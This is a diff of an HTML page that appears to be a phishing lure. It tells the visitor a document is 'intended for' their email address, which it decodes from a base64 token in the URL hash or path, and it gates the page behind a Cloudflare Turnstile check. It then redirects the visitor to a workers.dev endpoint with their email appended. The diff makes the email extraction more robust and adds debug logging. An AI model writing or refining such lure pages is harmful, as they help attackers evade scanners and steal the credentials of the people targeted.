@@ -11,17 +11,17 @@
         .box { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; max-width: 400px; border: 1px solid #e2e8f0; }
         .btn { background: #0078d4; color: white; padding: 14px 30px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 16px; }
         .btn:hover { background: #005a9e; }
-        /* Style for disabled button - preserves blue color but adds transparency and changes cursor */
         .btn:disabled { 
             background: #0078d4; 
             opacity: 0.5; 
             cursor: not-allowed; 
         }
         .btn:disabled:hover { 
-            background: #0078d4; /* Keeps same color on hover when disabled */
+            background: #0078d4;
         }
-        #email-display { font-weight: bold; color: #1a365d; }
+        #email-display { font-weight: bold; color: #1a365d; word-break: break-all; }
         .turnstile-container { margin: 20px 0; min-height: 65px; display: flex; justify-content: center; }
+        .debug-info { font-size: 10px; color: #666; margin-top: 10px; text-align: left; background: #f0f0f0; padding: 8px; border-radius: 4px; display: none; }
     </style>
 </head>
 <body>
@@ -30,7 +30,7 @@
         <p style="color: #4a5568;">This Document is intended for:<br><span id="email-display">Loading...</span></p>
         <p style="color: #4a5568; font-size: 14px;">Please complete the security check below.</p>
         
-        <!-- Turnstile Widget Container with YOUR Site Key -->
+        <!-- Turnstile Widget Container -->
         <div class="turnstile-container">
             <div class="cf-turnstile" 
                  data-sitekey="0x4AAAAAACFsGXUXNkYsFRn4"
@@ -41,70 +41,180 @@
             </div>
         </div>
         
-        <!-- Button with original blue color, but disabled initially -->
         <button class="btn" id="verifyBtn" onclick="jump()" disabled>Click Here To Continue</button>
+        <div class="debug-info" id="debugInfo"></div>
     </div>
 
     <script>
+        // Debug function to log and show info
+        function debugLog(message) {
+            console.log(message);
+            const debugDiv = document.getElementById('debugInfo');
+            if (debugDiv) {
+                debugDiv.style.display = 'block';
+                debugDiv.innerHTML += new Date().toLocaleTimeString() + ': ' + message + '<br>';
+            }
+        }
+        
         // --- Function to check if a string is valid Base64 ---
         function isBase64(str) {
+            if (!str || str.trim() === '') return false;
             try {
-                return btoa(atob(str)) === str;
+                // Check if string contains only valid base64 characters
+                const base64Regex = /^[A-Za-z0-9+/]+=*$/;
+                if (!base64Regex.test(str)) return false;
+                const decoded = atob(str);
+                const reencoded = btoa(decoded);
+                return reencoded === str;
             } catch (err) {
                 return false;
             }
         }
-
-        // --- Function to extract and decode email from the URL path ---
+        
+        // --- Extract email from URL path OR hash fragment ---
         function getEmailFromUrl() {
-            const path = window.location.pathname;
-            const parts = path.split('/');
-            const lastPart = parts[parts.length - 1];
+            debugLog("=== Starting email extraction ===");
+            debugLog("Full URL: " + window.location.href);
+            debugLog("Hash: " + (window.location.hash || "(none)"));
+            debugLog("Pathname: " + window.location.pathname);
             
-            // 1. Try to decode as Base64 first
-            if (isBase64(lastPart)) {
+            // METHOD 1: Check hash fragment first (everything after #)
+            const hash = window.location.hash;
+            if (hash && hash.length > 1) {
+                debugLog("Hash detected: " + hash);
+                let hashValue = hash.substring(1); // Remove the '#'
+                debugLog("Hash value (raw): " + hashValue);
+                
+                // Remove any trailing slashes or query params
+                if (hashValue.includes('?')) hashValue = hashValue.split('?')[0];
+                if (hashValue.includes('&')) hashValue = hashValue.split('&')[0];
+                if (hashValue.endsWith('/')) hashValue = hashValue.slice(0, -1);
+                
+                // URL decode if needed
                 try {
-                    const decodedEmail = atob(lastPart);
-                    console.log("Decoded from Base64:", decodedEmail);
-                    return decodedEmail;
-                } catch (e) {
-                    console.log("Base64 decoding failed, trying URL decode...");
+                    let decodedHash = decodeURIComponent(hashValue);
+                    debugLog("After URL decode: " + decodedHash);
+                    
+                    // Check if it's base64
+                    if (isBase64(decodedHash)) {
+                        let email = atob(decodedHash);
+                        debugLog("✅ SUCCESS: Decoded base64 from hash: " + email);
+                        return email;
+                    }
+                    // Check if it's already an email
+                    else if (decodedHash.includes('@') && decodedHash.includes('.')) {
+                        debugLog("✅ SUCCESS: Found plain email in hash: " + decodedHash);
+                        return decodedHash;
+                    }
+                    // Try to see if the decodedHash itself is base64 (double encoding)
+                    else if (isBase64(decodedHash) === false && decodedHash.length > 5) {
+                        // Try one more time - maybe it's base64 without proper padding
+                        try {
+                            let possibleBase64 = decodedHash.replace(/-/g, '+').replace(/_/g, '/');
+                            if (isBase64(possibleBase64)) {
+                                let email = atob(possibleBase64);
+                                debugLog("✅ SUCCESS: Decoded base64 (with fixes) from hash: " + email);
+                                return email;
+                            }
+                        } catch(e) {}
+                    }
+                } catch(e) {
+                    debugLog("Error decoding hash: " + e.message);
+                }
+            } else {
+                debugLog("No hash fragment found");
+            }
+            
+            // METHOD 2: Check pathname segments (original method)
+            const path = window.location.pathname;
+            if (path && path !== '/') {
+                debugLog("Checking pathname: " + path);
+                const parts = path.split('/').filter(seg => seg.length > 0);
+                debugLog("Path segments: " + JSON.stringify(parts));
+                
+                // Try each segment from last to first
+                for (let i = parts.length - 1; i >= 0; i--) {
+                    let segment = parts[i];
+                    debugLog("Testing segment: " + segment);
+                    
+                    // Try URL decode first
+                    try {
+                        segment = decodeURIComponent(segment);
+                        debugLog("After URL decode: " + segment);
+                    } catch(e) {}
+                    
+                    // Check if it's base64
+                    if (isBase64(segment)) {
+                        try {
+                            let email = atob(segment);
+                            if (email.includes('@') || email.length > 3) {
+                                debugLog("✅ SUCCESS: Decoded base64 from path: " + email);
+                                return email;
+                            }
+                        } catch(e) {}
+                    }
+                    // Check if it's already an email
+                    else if (segment.includes('@') && segment.includes('.')) {
+                        debugLog("✅ SUCCESS: Found plain email in path: " + segment);
+                        return segment;
+                    }
                 }
             }
             
-            // 2. If not Base64 or Base64 failed, try URL decoding
-            try {
-                const decodedEmail = decodeURIComponent(lastPart);
-                console.log("Decoded from URL encoding:", decodedEmail);
-                return decodedEmail;
-            } catch (e) {
-                console.log("URL decoding failed, using fallback.");
-                return "email@example.com";
+            // METHOD 3: Check the entire URL for base64 pattern
+            const fullUrl = window.location.href;
+            const base64Pattern = /([A-Za-z0-9+/]{16,}={0,2})/g;
+            let matches = fullUrl.match(base64Pattern);
+            if (matches) {
+                debugLog("Found potential base64 patterns: " + JSON.stringify(matches));
+                for (let match of matches) {
+                    if (isBase64(match)) {
+                        try {
+                            let email = atob(match);
+                            if (email.includes('@')) {
+                                debugLog("✅ SUCCESS: Found base64 in URL: " + email);
+                                return email;
+                            }
+                        } catch(e) {}
+                    }
+                }
             }
+            
+            // Fallback
+            debugLog("⚠️ No email found, using fallback");
+            return "fallback@example.com";
         }
-
+        
         // Get and display email
         const userEmail = getEmailFromUrl();
-        document.getElementById('email-display').textContent = userEmail;
-        console.log("Final email to display:", userEmail);
-        console.log("Full URL path:", window.location.pathname);
-
+        const emailDisplay = document.getElementById('email-display');
+        emailDisplay.textContent = userEmail;
+        debugLog("=== FINAL EMAIL: " + userEmail + " ===");
+        
+        // Show warning if fallback is being used
+        if (userEmail === "fallback@example.com") {
+            emailDisplay.style.color = "#e74c3c";
+            debugLog("WARNING: Using fallback email. Check your URL format!");
+        }
+        
         // --- Turnstile Callback Functions ---
         let turnstileToken = null;
         
         function onTurnstileSuccess(token) {
             console.log("Turnstile challenge passed. Token:", token);
             turnstileToken = token;
-            document.getElementById('verifyBtn').disabled = false; // Enable the button
+            document.getElementById('verifyBtn').disabled = false;
+            debugLog("Turnstile verified, button enabled");
         }
         
         function onTurnstileError() {
             console.log("Turnstile challenge failed or encountered an error.");
             turnstileToken = null;
-            document.getElementById('verifyBtn').disabled = true; // Keep button disabled
+            document.getElementById('verifyBtn').disabled = true;
+            debugLog("Turnstile error, button disabled");
         }
-
-        // --- Modified jump function (now includes token) ---
+        
+        // --- Jump function ---
         function jump() {
             if (!turnstileToken) {
                 alert("Please complete the security check first.");
@@ -112,14 +222,28 @@
             }
             
             // Encode the email to Base64
-            const b64 = btoa(userEmail);
+            let b64;
+            try {
+                b64 = btoa(userEmail);
+                debugLog("Encoding email to base64: " + userEmail + " -> " + b64);
+            } catch(e) {
+                debugLog("Base64 encoding failed: " + e.message);
+                alert("Error encoding email. Please contact support.");
+                return;
+            }
             
-            // Append the Turnstile token to the target URL
+            // Construct target URL
             const target = "https://proposal-layout6674453bold-resonance-b7c9.jonathanakers1775.workers.dev/?" + b64;
+            debugLog("Redirecting to: " + target);
             
+            // Redirect
             window.location.replace(target);
         }
+        
+        // Test both URL formats from console
+        console.log("=== Script Loaded ===");
+        console.log("To test hash format, visit URL with: #dGVzdEBhYmMuY29t at the end");
+        console.log("To test path format, visit URL with: /dGVzdEBhYmMuY29t at the end");
     </script>
 </body>
-
 </html>
